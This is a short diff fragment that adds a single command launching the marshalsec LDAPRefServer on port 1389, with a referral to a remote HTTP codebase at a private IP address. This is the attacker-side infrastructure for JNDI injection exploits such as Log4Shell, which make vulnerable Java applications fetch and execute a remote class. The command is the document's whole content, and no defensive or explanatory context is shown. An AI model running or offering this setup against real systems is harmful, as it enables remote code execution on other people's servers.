@@ -1,0 +1,5 @@
+
+
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.86.190/#SampleVector 1389
+
+
